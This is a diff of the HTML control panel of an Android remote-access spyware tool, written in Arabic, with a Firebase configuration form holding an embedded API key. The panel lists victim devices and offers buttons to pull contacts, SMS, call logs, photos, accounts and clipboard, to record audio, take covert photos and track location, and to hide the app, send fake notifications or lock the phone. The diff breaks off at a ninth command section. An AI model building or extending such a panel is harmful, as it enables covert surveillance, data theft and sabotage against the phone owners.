@@ -3,88 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>💀 بلاك - التحكم</title>
+    <title>💀 بلاك - التحكم الشيطاني</title>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Orbitron',monospace}
-        body{background:#0a0000;color:#00ff00;padding:10px;max-width:600px;margin:auto;min-height:100vh;overflow-x:hidden;position:relative}
+        body{background:#0a0000;color:#00ff00;padding:10px;max-width:800px;margin:auto;min-height:100vh;overflow-x:hidden;position:relative}
         body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 20% 50%, rgba(255,0,0,0.05) 0%, transparent 50%), radial-gradient(circle at 80% 50%, rgba(0,255,0,0.03) 0%, transparent 50%);pointer-events:none;z-index:0}
         .circle{position:fixed;border-radius:50%;border:1px solid rgba(255,0,0,0.05);pointer-events:none;z-index:0}
-        .circle.c1{width:300px;height:300px;top:-100px;right:-100px;border-color:rgba(255,0,0,0.08)}
-        .circle.c2{width:200px;height:200px;bottom:-50px;left:-50px;border-color:rgba(0,255,0,0.05)}
-        .circle.c3{width:150px;height:150px;top:50%;left:50%;transform:translate(-50%,-50%);border-color:rgba(255,0,0,0.03)}
+        .circle.c1{width:400px;height:400px;top:-150px;right:-150px;border-color:rgba(255,0,0,0.08)}
+        .circle.c2{width:300px;height:300px;bottom:-100px;left:-100px;border-color:rgba(0,255,0,0.05)}
+        .circle.c3{width:200px;height:200px;top:50%;left:50%;transform:translate(-50%,-50%);border-color:rgba(255,0,0,0.03)}
         .glitch{position:fixed;top:0;left:0;width:100%;height:2px;background:linear-gradient(90deg,transparent,#ff0000,transparent);animation:glitchLine 3s infinite;z-index:1;opacity:0.3}
         @keyframes glitchLine{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
-        .header{background:linear-gradient(135deg,#0a0000,#1a0000);padding:15px;border-radius:15px;text-align:center;margin-bottom:12px;border:1px solid #ff0000;box-shadow:0 0 40px rgba(255,0,0,0.15),inset 0 0 40px rgba(255,0,0,0.05);position:relative;z-index:2}
-        .header .skull{font-size:32px;display:block;text-shadow:0 0 30px #ff0000;animation:pulseSkull 2s infinite}
-        @keyframes pulseSkull{0%,100%{text-shadow:0 0 20px #ff0000;transform:scale(1)}50%{text-shadow:0 0 40px #ff0000,0 0 80px #ff0000;transform:scale(1.05)}}
-        .header h1{font-size:20px;color:#ff0000;text-shadow:0 0 20px #ff0000;letter-spacing:4px;margin:4px 0}
-        .header .sub{font-size:9px;color:#00ff00;letter-spacing:3px;opacity:0.7;font-family:monospace}
+        .header{background:linear-gradient(135deg,#0a0000,#1a0000);padding:20px;border-radius:20px;text-align:center;margin-bottom:15px;border:2px solid #ff0000;box-shadow:0 0 50px rgba(255,0,0,0.2);position:relative;z-index:2}
+        .header .skull{font-size:40px;display:block;text-shadow:0 0 30px #ff0000;animation:pulseSkull 2s infinite}
+        @keyframes pulseSkull{0%,100%{text-shadow:0 0 20px #ff0000;transform:scale(1)}50%{text-shadow:0 0 60px #ff0000,0 0 100px #ff0000;transform:scale(1.05)}}
+        .header h1{font-size:26px;color:#ff0000;text-shadow:0 0 30px #ff0000;letter-spacing:6px;margin:6px 0}
+        .header .sub{font-size:11px;color:#00ff00;letter-spacing:4px;opacity:0.8;font-family:monospace}
         .header .sub span{color:#ff0000}
-        .setup{background:#0a0000;padding:15px;border-radius:15px;margin-bottom:12px;border:1px solid #330000;position:relative;z-index:2}
-        .setup h3{color:#ff0000;font-size:12px;letter-spacing:2px;margin-bottom:10px;text-shadow:0 0 10px #ff0000}
-        .setup input{width:100%;padding:10px 12px;margin-bottom:8px;border-radius:8px;border:1px solid #330000;background:#0a0000;color:#00ff00;font-size:12px;outline:none;transition:0.3s;font-family:monospace}
-        .setup input:focus{border-color:#ff0000;box-shadow:0 0 20px rgba(255,0,0,0.1)}
-        .setup button{width:100%;padding:12px;background:linear-gradient(135deg,#ff0000,#660000);color:#000;border:none;border-radius:8px;font-size:14px;cursor:pointer;font-weight:bold;text-shadow:0 0 10px #ff0000;transition:0.3s;letter-spacing:2px}
-        .setup button:hover{box-shadow:0 0 40px rgba(255,0,0,0.3);transform:scale(1.01)}
-        .device-list{background:#0a0000;padding:12px;border-radius:15px;margin-bottom:12px;border:1px solid #003300;position:relative;z-index:2}
-        .device-list h3{color:#00ff00;font-size:12px;letter-spacing:2px;margin-bottom:10px;text-shadow:0 0 10px #00ff00}
-        .device-item{padding:10px 14px;border:1px solid #003300;border-radius:10px;margin-bottom:6px;cursor:pointer;display:flex;justify-content:space-between;align-items:center;background:#0a0000;transition:0.3s}
-        .device-item:hover{border-color:#00ff00;box-shadow:0 0 20px rgba(0,255,0,0.1)}
-        .device-item.active{border-color:#ff0000;background:#1a0000;box-shadow:0 0 30px rgba(255,0,0,0.15)}
-        .device-item .status{font-size:9px;color:#00ff00;font-family:monospace}
-        .section-title{font-size:11px;color:#ff0000;letter-spacing:3px;margin:15px 0 10px;border-bottom:1px solid #330000;padding-bottom:6px;text-shadow:0 0 10px #ff0000;position:relative;z-index:2}
-        .section-title .skull-small{font-size:14px;margin-left:6px}
-        .controls-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;position:relative;z-index:2}
-        .ctrl-btn{padding:8px 4px;border:1px solid #330000;border-radius:10px;text-align:center;cursor:pointer;background:#0a0000;font-size:8px;transition:0.3s;color:#cc0000;font-family:monospace}
-        .ctrl-btn:hover{border-color:#ff0000;background:#1a0000;box-shadow:0 0 20px rgba(255,0,0,0.15);transform:scale(1.02)}
-        .ctrl-btn .icon{font-size:18px;display:block;margin-bottom:2px}
+        
+        .setup{background:#0a0000;padding:20px;border-radius:20px;margin-bottom:15px;border:2px solid #330000;position:relative;z-index:2}
+        .setup h3{color:#ff0000;font-size:14px;letter-spacing:3px;margin-bottom:12px;text-shadow:0 0 15px #ff0000}
+        .setup input{width:100%;padding:14px;margin-bottom:10px;border-radius:12px;border:2px solid #330000;background:#0a0000;color:#00ff00;font-size:14px;outline:none;transition:0.3s;font-family:monospace}
+        .setup input:focus{border-color:#ff0000;box-shadow:0 0 30px rgba(255,0,0,0.2)}
+        .setup button{width:100%;padding:16px;background:linear-gradient(135deg,#ff0000,#660000);color:#000;border:none;border-radius:12px;font-size:18px;cursor:pointer;font-weight:bold;text-shadow:0 0 20px #ff0000;transition:0.3s;letter-spacing:3px}
+        .setup button:hover{box-shadow:0 0 60px rgba(255,0,0,0.4);transform:scale(1.02)}
+        
+        .device-list{background:#0a0000;padding:15px;border-radius:20px;margin-bottom:15px;border:2px solid #003300;position:relative;z-index:2}
+        .device-list h3{color:#00ff00;font-size:14px;letter-spacing:3px;margin-bottom:12px;text-shadow:0 0 15px #00ff00}
+        .device-item{padding:16px 20px;border:2px solid #003300;border-radius:14px;margin-bottom:8px;cursor:pointer;display:flex;justify-content:space-between;align-items:center;background:#0a0000;transition:0.3s;font-size:14px}
+        .device-item:hover{border-color:#00ff00;box-shadow:0 0 30px rgba(0,255,0,0.15);transform:scale(1.01)}
+        .device-item.active{border-color:#ff0000;background:#1a0000;box-shadow:0 0 40px rgba(255,0,0,0.2)}
+        .device-item .status{font-size:11px;color:#00ff00;font-family:monospace}
+        .device-item .version{font-size:10px;color:#666;margin-right:10px}
+        
+        .section-title{font-size:13px;color:#ff0000;letter-spacing:4px;margin:20px 0 12px;border-bottom:2px solid #330000;padding-bottom:8px;text-shadow:0 0 20px #ff0000;position:relative;z-index:2}
+        .section-title .skull-small{font-size:18px;margin-left:8px}
+        
+        .controls-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:10px;position:relative;z-index:2}
+        .ctrl-btn{padding:14px 8px;border:2px solid #330000;border-radius:14px;text-align:center;cursor:pointer;background:#0a0000;font-size:10px;transition:0.3s;color:#cc0000;font-family:monospace;min-height:80px;display:flex;flex-direction:column;align-items:center;justify-content:center}
+        .ctrl-btn:hover{border-color:#ff0000;background:#1a0000;box-shadow:0 0 30px rgba(255,0,0,0.2);transform:scale(1.03)}
+        .ctrl-btn .icon{font-size:26px;display:block;margin-bottom:4px}
+        .ctrl-btn .label{font-size:10px}
         .ctrl-btn.file-btn{border-color:#003300}
-        .ctrl-btn.file-btn:hover{border-color:#00ff00;box-shadow:0 0 20px rgba(0,255,0,0.1)}
+        .ctrl-btn.file-btn:hover{border-color:#00ff00;box-shadow:0 0 30px rgba(0,255,0,0.15)}
         .ctrl-btn.control-btn{border-color:#000033}
-        .ctrl-btn.control-btn:hover{border-color:#0066ff;box-shadow:0 0 20px rgba(0,102,255,0.1)}
+        .ctrl-btn.control-btn:hover{border-color:#0066ff;box-shadow:0 0 30px rgba(0,102,255,0.15)}
         .ctrl-btn.danger-btn{border-color:#330000}
-        .ctrl-btn.danger-btn:hover{border-color:#ff0000;box-shadow:0 0 30px rgba(255,0,0,0.2)}
-        .log{background:#0a0000;padding:10px;border-radius:10px;margin-top:12px;max-height:120px;overflow-y:auto;font-family:monospace;font-size:9px;color:#00ff00;border:1px solid #003300;position:relative;z-index:2}
+        .ctrl-btn.danger-btn:hover{border-color:#ff0000;box-shadow:0 0 40px rgba(255,0,0,0.3)}
+        .ctrl-btn.special-btn{border-color:#660066}
+        .ctrl-btn.special-btn:hover{border-color:#ff00ff;box-shadow:0 0 30px rgba(255,0,255,0.15)}
+        
+        .log{background:#0a0000;padding:12px;border-radius:14px;margin-top:15px;max-height:150px;overflow-y:auto;font-family:monospace;font-size:10px;color:#00ff00;border:2px solid #003300;position:relative;z-index:2}
         .log .time{color:#660000}
-        .page{display:none;animation:fadeIn 0.3s;position:relative;z-index:2}
+        
+        .page{display:none;animation:fadeIn 0.4s;position:relative;z-index:2}
         .page.active{display:block}
-        @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
-        .back-btn{background:#0a0000;color:#ff0000;border:1px solid #330000;padding:8px 16px;border-radius:8px;cursor:pointer;margin-bottom:12px;font-size:10px;font-family:monospace;transition:0.3s}
-        .back-btn:hover{border-color:#ff0000;box-shadow:0 0 20px rgba(255,0,0,0.1)}
-        .selected-device{color:#ff0000;font-weight:bold;font-size:13px;text-align:center;padding:10px;background:#1a0000;border-radius:10px;margin-bottom:12px;border:1px solid #ff0000;text-shadow:0 0 15px #ff0000;font-family:monospace}
-        .result-title{color:#ff0000;font-size:16px;margin-bottom:10px;text-shadow:0 0 20px #ff0000;font-family:monospace}
-        .result-content{background:#0a0000;padding:12px;border-radius:10px;max-height:250px;overflow-y:auto;font-size:11px;color:#fff;border:1px solid #330000;white-space:pre-wrap;font-family:monospace}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+        
+        .back-btn{background:#0a0000;color:#ff0000;border:2px solid #330000;padding:10px 20px;border-radius:12px;cursor:pointer;margin-bottom:15px;font-size:12px;font-family:monospace;transition:0.3s}
+        .back-btn:hover{border-color:#ff0000;box-shadow:0 0 30px rgba(255,0,0,0.15)}
+        
+        .selected-device{color:#ff0000;font-weight:bold;font-size:16px;text-align:center;padding:14px;background:#1a0000;border-radius:14px;margin-bottom:15px;border:2px solid #ff0000;text-shadow:0 0 20px #ff0000;font-family:monospace}
+        
+        .result-title{color:#ff0000;font-size:20px;margin-bottom:12px;text-shadow:0 0 30px #ff0000;font-family:monospace}
+        .result-content{background:#0a0000;padding:16px;border-radius:14px;max-height:350px;overflow-y:auto;font-size:12px;color:#fff;border:2px solid #330000;white-space:pre-wrap;font-family:monospace}
         .result-content .location-link{color:#0066ff;text-decoration:underline;cursor:pointer}
         .result-content .file-received{color:#00ff00}
-        .download-btn{background:#00ff00;color:#000;padding:8px 16px;border:none;border-radius:8px;cursor:pointer;font-weight:bold;margin-top:8px;margin-right:6px;font-size:11px;font-family:monospace}
-        .open-btn{background:#0066ff;color:#fff;padding:8px 16px;border:none;border-radius:8px;cursor:pointer;font-weight:bold;margin-top:8px;font-size:11px;font-family:monospace}
-        .file-path{color:#666;font-size:10px;margin-top:6px;font-family:monospace}
-        .footer{text-align:center;margin-top:15px;font-size:7px;color:#330000;letter-spacing:3px;font-family:monospace;position:relative;z-index:2}
+        .result-content .file-view{background:#0a1a0a;padding:10px;border-radius:8px;border:1px solid #00ff00;margin:5px 0}
+        
+        .download-btn{background:#00ff00;color:#000;padding:12px 24px;border:none;border-radius:12px;cursor:pointer;font-weight:bold;margin-top:10px;margin-right:8px;font-size:13px;font-family:monospace}
+        .open-btn{background:#0066ff;color:#fff;padding:12px 24px;border:none;border-radius:12px;cursor:pointer;font-weight:bold;margin-top:10px;font-size:13px;font-family:monospace}
+        .view-btn{background:#ff00ff;color:#000;padding:12px 24px;border:none;border-radius:12px;cursor:pointer;font-weight:bold;margin-top:10px;margin-right:8px;font-size:13px;font-family:monospace}
+        .file-path{color:#666;font-size:11px;margin-top:8px;font-family:monospace}
+        
+        .footer{text-align:center;margin-top:20px;font-size:8px;color:#330000;letter-spacing:4px;font-family:monospace;position:relative;z-index:2}
         .footer span{color:#660000}
-        .hacker-text{font-size:7px;color:#003300;letter-spacing:2px;text-align:center;margin-top:6px;font-family:monospace;position:relative;z-index:2}
-        @media(max-width:400px){.controls-grid{grid-template-columns:repeat(3,1fr)}.ctrl-btn{font-size:7px;padding:6px 2px}.ctrl-btn .icon{font-size:15px}}
-        .action-message{background:#0a1a0a;color:#00ff00;padding:8px;border-radius:8px;margin-top:8px;border:1px solid #00ff00;font-size:10px;text-align:center}
+        .hacker-text{font-size:8px;color:#003300;letter-spacing:3px;text-align:center;margin-top:8px;font-family:monospace;position:relative;z-index:2}
+        
+        .action-message{background:#0a1a0a;color:#00ff00;padding:12px;border-radius:12px;margin-top:10px;border:2px solid #00ff00;font-size:12px;text-align:center}
         .action-message.danger{background:#1a0a0a;color:#ff0000;border-color:#ff0000}
+        .action-message.success{background:#0a1a0a;color:#00ff00;border-color:#00ff00}
+        
+        .count-selector{background:#0a0000;padding:10px;border-radius:10px;border:1px solid #330000;margin:5px 0;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+        .count-selector label{color:#aaa;font-size:11px}
+        .count-selector input{background:#0a0000;color:#00ff00;border:1px solid #330000;border-radius:6px;padding:6px 10px;width:60px;font-size:12px}
+        .count-selector button{background:#330000;color:#fff;border:none;border-radius:6px;padding:6px 12px;cursor:pointer;font-size:11px}
+        
+        .flash-options{display:grid;grid-template-columns:repeat(2,1fr);gap:8px;margin:5px 0}
+        .flash-options .mini-btn{padding:8px;border:1px solid #330000;border-radius:8px;text-align:center;cursor:pointer;background:#0a0000;font-size:9px;transition:0.3s}
+        .flash-options .mini-btn:hover{border-color:#ff0000;background:#1a0000}
+        
+        @media(max-width:500px){.controls-grid{grid-template-columns:repeat(2,1fr)}.ctrl-btn{min-height:70px;padding:10px 4px}.ctrl-btn .icon{font-size:20px}}
     </style>
 </head>
 <body>
-    <!-- دوائر زخرفية -->
     <div class="circle c1"></div>
     <div class="circle c2"></div>
     <div class="circle c3"></div>
     <div class="glitch"></div>
 
-    <!-- الرأس -->
     <div class="header">
         <span class="skull">💀</span>
         <h1>بـــلاك</h1>
         <div class="sub">/// <span>اختراق</span>_الـ<span>نظام</span> ///</div>
     </div>
 
-    <!-- إعدادات Firebase -->
     <div class="setup" id="setupSection">
         <h3>⚡ إعدادات فايربيز</h3>
         <input type="text" id="apiKey" placeholder="مفتاح API" value="AIzaSyDBizqAKWSwGsicO6eRua-5x_8VQLFKTIc">
@@ -92,80 +118,165 @@
         <button onclick="initFirebase()">🚀 اتصال</button>
     </div>
 
-    <!-- الصفحة الرئيسية (الأجهزة) -->
     <div id="mainPage" class="page active">
         <div class="device-list">
-            <h3>📡 الأجهزة المتصلة <span style="color:#ff0000;font-size:10px;" id="deviceCount">(0)</span></h3>
+            <h3>📡 الأجهزة المتصلة <span style="color:#ff0000;font-size:12px;" id="deviceCount">(0)</span></h3>
             <div id="devices"></div>
         </div>
     </div>
-
-    <!-- صفحة الأوامر -->
     <div id="commandsPage" class="page">
         <button class="back-btn" onclick="showPage('mainPage')">🔙 رجوع</button>
         <div id="selectedDisplay" class="selected-device">🎯 الجهاز المحدد: —</div>
+        <div id="deviceVersion" style="text-align:center;color:#666;font-size:11px;margin-bottom:10px;">📱 أندرويد: —</div>
 
-        <div class="section-title"><span class="skull-small">💀</span> أوامر الملفات</div>
-        <div class="controls-grid" id="fileCommands">
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_contacts')"><span class="icon">📇</span>جهات الاتصال</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_sms')"><span class="icon">💬</span>الرسائل</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_calllogs')"><span class="icon">📞</span>سجل المكالمات</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_photos')"><span class="icon">🖼</span>الصور</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_videos')"><span class="icon">🎬</span>الفيديوهات</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_files')"><span class="icon">📦</span>جميع الملفات</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_apps')"><span class="icon">📱</span>التطبيقات</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_clipboard')"><span class="icon">📋</span>الحافظة</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_accounts')"><span class="icon">👤</span>الحسابات</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_device')"><span class="icon">ℹ️</span>معلومات الجهاز</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_network')"><span class="icon">📡</span>معلومات الشبكة</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_imei')"><span class="icon">📟</span>الـ IMEI</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_phone')"><span class="icon">📞</span>رقم الهاتف</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_sim')"><span class="icon">📡</span>معلومات الشريحة</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_wifi')"><span class="icon">📶</span>الواي فاي</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_battery')"><span class="icon">🔋</span>البطارية</div>
-            <div class="ctrl-btn file-btn" onclick="execCmd('get_ip')"><span class="icon">🌐</span>الـ IP العام</div>
+        <!-- ===== القسم 1: أوامر الملفات ===== -->
+        <div class="section-title"><span class="skull-small">💀</span> 📂 أوامر الملفات</div>
+        <div class="controls-grid">
+            <div class="ctrl-btn file-btn" onclick="showCountSelector('get_contacts','جهات الاتصال')"><span class="icon">📇</span><span class="label">جهات الاتصال</span></div>
+            <div class="ctrl-btn file-btn" onclick="showCountSelector('get_sms','الرسائل')"><span class="icon">💬</span><span class="label">الرسائل</span></div>
+            <div class="ctrl-btn file-btn" onclick="showCountSelector('get_calllogs','سجل المكالمات')"><span class="icon">📞</span><span class="label">سجل المكالمات</span></div>
+            <div class="ctrl-btn file-btn" onclick="showCountSelector('get_photos','الصور')"><span class="icon">🖼</span><span class="label">الصور</span></div>
+            <div class="ctrl-btn file-btn" onclick="showCountSelector('get_videos','الفيديوهات')"><span class="icon">🎬</span><span class="label">الفيديوهات</span></div>
+            <div class="ctrl-btn file-btn" onclick="showCountSelector('get_files','الملفات')"><span class="icon">📦</span><span class="label">جميع الملفات</span></div>
+            <div class="ctrl-btn file-btn" onclick="showCountSelector('get_apps','التطبيقات')"><span class="icon">📱</span><span class="label">التطبيقات</span></div>
+            <div class="ctrl-btn file-btn" onclick="showCountSelector('get_clipboard','الحافظة')"><span class="icon">📋</span><span class="label">الحافظة</span></div>
+            <div class="ctrl-btn file-btn" onclick="showCountSelector('get_accounts','الحسابات')"><span class="icon">👤</span><span class="label">الحسابات</span></div>
         </div>
 
-        <div class="section-title"><span class="skull-small">💀</span> أوامر التحكم</div>
-        <div class="controls-grid" id="controlCommands">
-            <div class="ctrl-btn control-btn" onclick="execCmd('get_location')"><span class="icon">📍</span>الموقع</div>
-            <div class="ctrl-btn control-btn" onclick="execCmd('start_record')"><span class="icon">🎤</span>تسجيل صوت</div>
-            <div class="ctrl-btn control-btn" onclick="execCmd('stop_record')"><span class="icon">⏹</span>إيقاف التسجيل</div>
-            <div class="ctrl-btn control-btn" onclick="execCmd('take_photo')"><span class="icon">📸</span>تصوير خلفي</div>
-            <div class="ctrl-btn control-btn" onclick="execCmd('take_photo_front')"><span class="icon">🤳</span>تصوير أمامي</div>
-            <div class="ctrl-btn control-btn" onclick="execCmd('flash_on')"><span class="icon">🔦</span>تشغيل الكشاف</div>
-            <div class="ctrl-btn control-btn" onclick="execCmd('flash_off')"><span class="icon">🔦</span>إطفاء الكشاف</div>
-            <div class="ctrl-btn control-btn" onclick="execCmd('start_location_track')"><span class="icon">📍</span>تتبع الموقع</div>
-            <div class="ctrl-btn control-btn" onclick="execCmd('stop_location_track')"><span class="icon">🛑</span>إيقاف التتبع</div>
-            <div class="ctrl-btn danger-btn" onclick="execCmd('hide_app')"><span class="icon">👁‍🗨</span>إخفاء التطبيق</div>
-            <div class="ctrl-btn danger-btn" onclick="execCmd('show_app')"><span class="icon">👁</span>إظهار التطبيق</div>
-            <div class="ctrl-btn danger-btn" onclick="execCmd('fake_notif')"><span class="icon">🔔</span>إشعار وهمي</div>
-            <div class="ctrl-btn danger-btn" onclick="execCmd('lock_device')"><span class="icon">🔒</span>قفل الجهاز</div>
-            <div class="ctrl-btn danger-btn" onclick="execCmd('reboot')"><span class="icon">🔄</span>إعادة تشغيل</div>
-            <div class="ctrl-btn danger-btn" onclick="execCmd('shutdown')"><span class="icon">⏻</span>إيقاف تشغيل</div>
+        <!-- ===== القسم 2: أوامر المعلومات ===== -->
+        <div class="section-title"><span class="skull-small">💀</span> ℹ️ معلومات الجهاز</div>
+        <div class="controls-grid">
+            <div class="ctrl-btn control-btn" onclick="execCmd('get_device')"><span class="icon">📱</span><span class="label">معلومات الجهاز</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('get_network')"><span class="icon">📡</span><span class="label">معلومات الشبكة</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('get_imei')"><span class="icon">📟</span><span class="label">الـ IMEI</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('get_phone')"><span class="icon">📞</span><span class="label">رقم الهاتف</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('get_sim')"><span class="icon">📡</span><span class="label">معلومات الشريحة</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('get_wifi')"><span class="icon">📶</span><span class="label">الواي فاي</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('get_battery')"><span class="icon">🔋</span><span class="label">البطارية</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('get_ip')"><span class="icon">🌐</span><span class="label">الـ IP العام</span></div>
+        </div>
+
+        <!-- ===== القسم 3: أوامر الكاميرا والفلاش ===== -->
+        <div class="section-title"><span class="skull-small">💀</span> 📸 الكاميرا والفلاش</div>
+        <div class="controls-grid">
+            <div class="ctrl-btn control-btn" onclick="execCmd('take_photo')"><span class="icon">📸</span><span class="label">تصوير خلفي</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('take_photo_front')"><span class="icon">🤳</span><span class="label">تصوير أمامي</span></div>
+            <div class="ctrl-btn control-btn" onclick="showFlashOptions()"><span class="icon">🔦</span><span class="label">الفلاش</span></div>
+            <div class="ctrl-btn special-btn" onclick="execCmd('screenshot')"><span class="icon">🖥️</span><span class="label">لقطة شاشة</span></div>
+        </div>
+        <div id="flashOptions" style="display:none;background:#0a0000;padding:10px;border-radius:10px;border:1px solid #330000;margin:5px 0;">
+            <div class="flash-options">
+                <div class="mini-btn" onclick="execCmd('flash_on_front')">🔦 تشغيل أمامي</div>
+                <div class="mini-btn" onclick="execCmd('flash_off_front')">🔦 إطفاء أمامي</div>
+                <div class="mini-btn" onclick="execCmd('flash_on_back')">🔦 تشغيل خلفي</div>
+                <div class="mini-btn" onclick="execCmd('flash_off_back')">🔦 إطفاء خلفي</div>
+                <div class="mini-btn" style="border-color:#ff0000;" onclick="execCmd('flash_on_both')">🔦 تشغيل الاثنين</div>
+                <div class="mini-btn" style="border-color:#ff0000;" onclick="execCmd('flash_off_both')">🔦 إطفاء الاثنين</div>
+            </div>
+        </div>
+
+        <!-- ===== القسم 4: أوامر التحكم المباشر ===== -->
+        <div class="section-title"><span class="skull-small">💀</span> 🎯 أوامر التحكم</div>
+        <div class="controls-grid">
+            <div class="ctrl-btn control-btn" onclick="execCmd('get_location')"><span class="icon">📍</span><span class="label">الموقع</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('start_record')"><span class="icon">🎤</span><span class="label">تسجيل صوت</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('stop_record')"><span class="icon">⏹</span><span class="label">إيقاف التسجيل</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('start_location_track')"><span class="icon">📍</span><span class="label">تتبع الموقع</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('stop_location_track')"><span class="icon">🛑</span><span class="label">إيقاف التتبع</span></div>
+        </div>
+
+        <!-- ===== القسم 5: أوامر التخريب ===== -->
+        <div class="section-title"><span class="skull-small">💀</span> 💥 أوامر التخريب</div>
+        <div class="controls-grid">
+            <div class="ctrl-btn danger-btn" onclick="execCmd('hide_app')"><span class="icon">👁‍🗨</span><span class="label">إخفاء التطبيق</span></div>
+            <div class="ctrl-btn danger-btn" onclick="execCmd('show_app')"><span class="icon">👁</span><span class="label">إظهار التطبيق</span></div>
+            <div class="ctrl-btn danger-btn" onclick="execCmd('fake_notif')"><span class="icon">🔔</span><span class="label">إشعار وهمي</span></div>
+            <div class="ctrl-btn danger-btn" onclick="execCmd('lock_device')"><span class="icon">🔒</span><span class="label">قفل الجهاز</span></div>
+            <div class="ctrl-btn danger-btn" onclick="execCmd('reboot')"><span class="icon">🔄</span><span class="label">إعادة تشغيل</span></div>
+            <div class="ctrl-btn danger-btn" onclick="execCmd('shutdown')"><span class="icon">⏻</span><span class="label">إيقاف تشغيل</span></div>
+        </div>
+
+        <!-- ===== القسم 6: أوامر الشبكة والاتصال ===== -->
+        <div class="section-title"><span class="skull-small">💀</span> 📶 الشبكة والاتصال</div>
+        <div class="controls-grid">
+            <div class="ctrl-btn control-btn" onclick="execCmd('toggle_wifi_on')"><span class="icon">📶</span><span class="label">تشغيل الواي فاي</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('toggle_wifi_off')"><span class="icon">📶</span><span class="label">إيقاف الواي فاي</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('toggle_data_on')"><span class="icon">📶</span><span class="label">تشغيل البيانات</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('toggle_data_off')"><span class="icon">📶</span><span class="label">إيقاف البيانات</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('toggle_bluetooth_on')"><span class="icon">📶</span><span class="label">تشغيل البلوتوث</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('toggle_bluetooth_off')"><span class="icon">📶</span><span class="label">إيقاف البلوتوث</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('toggle_location_on')"><span class="icon">📍</span><span class="label">تشغيل الموقع</span></div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('toggle_location_off')"><span class="icon">📍</span><span class="label">إيقاف الموقع</span></div>
+        </div>
+
+        <!-- ===== القسم 7: أوامر متقدمة ===== -->
+        <div class="section-title"><span class="skull-small">💀</span> 🧠 أوامر متقدمة</div>
+        <div class="controls-grid">
+            <div class="ctrl-btn special-btn" onclick="execCmd('clear_data')"><span class="icon">🗑️</span><span class="label">مسح بيانات التطبيق</span></div>
+            <div class="ctrl-btn special-btn" onclick="execCmd('kill_apps')"><span class="icon">💀</span><span class="label">إيقاف جميع التطبيقات</span></div>
+            <div class="ctrl-btn special-btn" onclick="execCmd('vibrate')"><span class="icon">📳</span><span class="label">اهتزاز الجهاز</span></div>
+            <div class="ctrl-btn special-btn" onclick="execCmd('set_volume_max')"><span class="icon">🔊</span><span class="label">رفع الصوت للأعلى</span></div>
+            <div class="ctrl-btn special-btn" onclick="execCmd('set_volume_min')"><span class="icon">🔇</span><span class="label">خفض الصوت للأدنى</span></div>
+            <div class="ctrl-btn special-btn" onclick="execCmd('open_browser')"><span class="icon">🌐</span><span class="label">فتح متصفح</span></div>
+        </div>
+
+        <!-- ===== القسم 8: أوامر إدارة جهات الاتصال ===== -->
+        <div class="section-title"><span class="skull-small">💀</span> 👤 إدارة جهات الاتصال</div>
+        <div class="controls-grid">
+            <div class="ctrl-btn file-btn" onclick="showContactActions()"><span class="icon">➕</span><span class="label">إدارة جهات الاتصال</span></div>
+        </div>
+        <div id="contactActions" style="display:none;background:#0a0000;padding:10px;border-radius:10px;border:1px solid #330000;margin:5px 0;">
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+                <div class="mini-btn" onclick="execCmd('add_contact')">➕ إضافة جهة اتصال</div>
+                <div class="mini-btn" onclick="execCmd('delete_contact')">➖ حذف جهة اتصال</div>
+                <div class="mini-btn" onclick="execCmd('copy_contacts')">📋 نسخ جهات الاتصال</div>
+                <div class="mini-btn" onclick="execCmd('export_contacts')">📤 تصدير جهات الاتصال</div>
+            </div>
+        </div>
+
+        <!-- ===== القسم 9: أوامر الرسائل ===== -->
